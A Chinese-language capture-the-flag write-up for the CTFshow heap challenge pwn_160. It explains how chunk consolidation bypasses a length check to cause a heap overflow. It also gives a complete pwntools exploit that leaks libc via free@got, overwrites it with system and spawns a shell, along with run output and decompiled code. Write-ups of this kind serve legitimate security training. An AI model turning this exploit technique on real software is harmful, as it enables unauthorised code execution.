# CTFshow-pwn_160
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 堆利用（堆块合并相关的堆溢出）
## 解题思路
> 利用空闲堆块合并绕过限制进行堆溢出

仅没有 PIE 保护，部分 RELRO，本地libc使用 2.23-0ubuntu11.3_i386

```text
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ patchelf --set-interpreter ~/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/ld-2.23.so ./pwn_160
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ patchelf --set-rpath ~/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386 ./pwn_160
(forpwn) mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_160
[*] '/home/mrw/CTFshow/pwn_160'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8046000)
    RUNPATH:    b'/home/mrw/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386'
```
- 程序的 my_read 可以提供一个 off_by_one，但此处也可实现任意长度堆溢出  
- 程序提供了 heap 的增删查改，其中在申请时会先申请长度可控的 description chunk 再申请数据空间 0x80 的 name chunk，name 的前4字节用于存储 description 的地址，后面用于存储长度不超过124的名字。删除时先删除 description，再删除 name 且置0数组里的指针。update 中控制 description 更新时的长度验证仅能保证**当前 heap 的 description 起始地址 + 长度 < 当前 heap 的 name 起始地址**，但我们可以利用空闲堆块合并来使得申请时 new heap 的 description 与 name 之间包裹其他的 heap 从而进行堆溢出修改这些 heap 的 name 中存放的数据指针，进而实现任意读写  
- 由于题目未提供后门但未开启 PIE，利用方式为完成任意读写后泄露 free@got，计算 libc 基址，覆写 free@got，free掉"/bin/sh"提权即可  

**exp 如下**  
```python
from pwn import *
p = process('./pwn_160')
# context(log_level = 'debug')
libc = ELF('/home/mrw/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so')
gdb.attach(p)
# 与程序沟通
def add(siz, dp, name):
  p.sendlineafter(b'Action: ', b'0')
  p.sendlineafter(b'description: ', str(siz).encode())
  p.sendlineafter(b'name: ', name)
  p.sendlineafter(b'text length: ', str(siz).encode())
  p.sendlineafter(b'text: ', dp)

def delete(index):
  p.sendlineafter(b'Action: ', b'1')
  p.sendlineafter(b'index: ', str(index).encode())

def display(index):
  p.sendlineafter(b'Action: ', b'2')
  p.sendlineafter(b'index: ', str(index).encode())

def update(index, siz, dp):
  p.sendlineafter(b'Action: ', b'3')
  p.sendlineafter(b'index: ', str(index).encode())
  p.sendlineafter(b'text length: ', str(siz).encode())
  p.sendlineafter(b'text: ', dp)

# 制造任意读写
add(0x80, b'aaaa', b'a') # heap 0
add(0x10, b'bbbb', b'b') # heap 1
delete(0) 
add(0x108, b'cccc', b'c') # heap 2
add(0x8, b'/bin/sh\x00', b'/bin/sh\x00') # heap 3 （此脚本覆盖 free@got 时会多写入一个'\n' 到 fget@got 的最低位，造成之后无法读取，故提前申请 heap 3）
update(2, 0x108 + 0x8 + 0x10 + 0x8 + 0x4, b'a'*0x108 + p32(0) + p32(0x19) + b'a' * 0x10 + p32(0) + p32(0x89) + p32(0x0804b010)) # 修改 heap 1 头部 chunk 指向的 descrption chunk 为 free@got
# 计算 libc 基址
display(1)
p.recvuntil(b'description: ')
free_addr = u32(p.recv(4).ljust(4,b'\x00'))
libc_base = free_addr - libc.symbols['free']
print(f'free_addr is {free_addr:x} libc_base is {libc_base:x}')
# 写入 system 地址
system_addr = libc_base + libc.symbols['system']
update(1, 0x4, p32(system_addr))
# 提权
delete(3)
p.interactive()
```

## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ vim ./exp/pwn_160.py
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ python3 ./exp/pwn_160.py
[+] Starting local process './pwn_160': pid 24005
[*] '/home/mrw/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] running in new terminal: ['/usr/bin/gdb', '-q', './pwn_160', '24005']
[+] Waiting for debugger: Done
free_addr is f6ac8530 libc_base is f6a57000
[*] Switching to interactive mode
$ ls /
bin           dev     lib32            media  run               swap.img
bin.usr-is-merged  etc     lib64            mnt    sbin               sys
boot           flag  lib.usr-is-merged  opt    sbin.usr-is-merged  tmp
cdrom           home  libx32            proc   snap               usr
ctfshow_flag       lib     lost+found        root   srv               var
$ cat /ctfshow_flag
flag{Success!}
$ 
```

## 反编译后伪代码中有用的部分

反编译得到的有用的伪代码如下  
```c
unsigned int __cdecl my_read(char *a1, int a2)
{
  unsigned int result; // eax
  char *v3; // [esp+18h] [ebp-10h]
  unsigned int v4; // [esp+1Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  fgets(a1, a2, stdin);
  v3 = strchr(a1, 10);
  if ( v3 )
    *v3 = 0;
  result = __readgsdword(0x14u) ^ v4;
  if ( result )
    sub_8048EF0();
  return result;
}
unsigned int __cdecl update(unsigned __int8 a1)
{
  unsigned int result; // eax
  int v2; // [esp+18h] [ebp-10h] BYREF
  unsigned int v3; // [esp+1Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  if ( a1 < (unsigned __int8)byte_804B061 && dword_804B080[a1] )
  {
    v2 = 0;
    printf("text length: ");
    __isoc99_scanf("%u%c", &v2);
    if ( *(_DWORD *)dword_804B080[a1] + v2 >= (unsigned int)(dword_804B080[a1] - 4) )
    {
      puts("Wtf?");
      exit(1);
    }
    printf("text: ");
    my_read(*(char **)dword_804B080[a1], v2 + 1);
  }
  result = __readgsdword(0x14u) ^ v3;
  if ( result )
    sub_8048EF0();
  return result;
}
_DWORD *__cdecl add(size_t a1)
{
  _DWORD *result; // eax
  void *s; // [esp+14h] [ebp-14h]
  _DWORD *v3; // [esp+18h] [ebp-10h]
  unsigned int v4; // [esp+1Ch] [ebp-Ch]

  v4 = __readgsdword(0x14u);
  s = malloc(a1);
  memset(s, 0, a1);
  v3 = malloc(0x80u);
  memset(v3, 0, 0x80u);
  *v3 = s;
  dword_804B080[(unsigned __int8)byte_804B061] = v3;
  printf("name: ");
  my_read(dword_804B080[(unsigned __int8)byte_804B061] + 4, 124);
  update((unsigned __int8)byte_804B061++);
  result = v3;
  if ( __readgsdword(0x14u) != v4 )
    sub_8048EF0();
  return result;
}
unsigned int __cdecl delete(unsigned __int8 a1)
{
  unsigned int result; // eax
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  if ( a1 < (unsigned __int8)byte_804B061 && dword_804B080[a1] )
  {
    free(*(void **)dword_804B080[a1]);
    free((void *)dword_804B080[a1]);
    dword_804B080[a1] = 0;
  }
  result = __readgsdword(0x14u) ^ v2;
  if ( result )
    sub_8048EF0();
  return result;
}
unsigned int __cdecl display(unsigned __int8 a1)
{
  unsigned int result; // eax
  unsigned int v2; // [esp+1Ch] [ebp-Ch]

  v2 = __readgsdword(0x14u);
  if ( a1 < (unsigned __int8)byte_804B061 && dword_804B080[a1] )
  {
    printf("name: %s\n", dword_804B080[a1] + 4);
    printf("description: %s\n", *(_DWORD *)dword_804B080[a1]);
  }
  result = __readgsdword(0x14u) ^ v2;
  if ( result )
    sub_8048EF0();
  return result;
}
unsigned int menu()
{
  unsigned int result; // eax
  unsigned int v1; // [esp+Ch] [ebp-Ch]

  v1 = __readgsdword(0x14u);
  puts("0: Add a user");
  puts("1: Delete a user");
  puts("2: Display a user");
  puts("3: Update a user description");
  puts("4: Exit");
  printf("Action: ");
  result = __readgsdword(0x14u) ^ v1;
  if ( result )
    sub_8048EF0();
  return result;
}
void __cdecl __noreturn main(int a1)
{
  int v1; // [esp+2h] [ebp-14h] BYREF
  int v2[4]; // [esp+6h] [ebp-10h] BYREF

  v2[2] = (int)&a1;
  v2[1] = __readgsdword(0x14u);
  sub_80486C6();
  alarm(0x14u);
  sub_8048728();
  while ( 1 )
  {
    menu();
    if ( __isoc99_scanf("%d", &v1) == -1 )
      break;
    if ( !v1 )
    {
      printf("size of description: ");
      __isoc99_scanf("%u%c", v2);
      add(v2[0]);
    }
    if ( v1 == 1 )
    {
      printf("index: ");
      __isoc99_scanf("%d", v2);
      delete(LOBYTE(v2[0]));
    }
    if ( v1 == 2 )
    {
      printf("index: ");
      __isoc99_scanf("%d", v2);
      display(LOBYTE(v2[0]));
    }
    if ( v1 == 3 )
    {
      printf("index: ");
      __isoc99_scanf("%d", v2);
      update(LOBYTE(v2[0]));
    }
    if ( v1 == 4 )
    {
      puts("Bye");
      exit(0);
    }
    if ( (unsigned __int8)byte_804B061 > 0x31u )
    {
      puts("MAX,see you~");
      exit(0);
    }
  }
  exit(1);
}
```
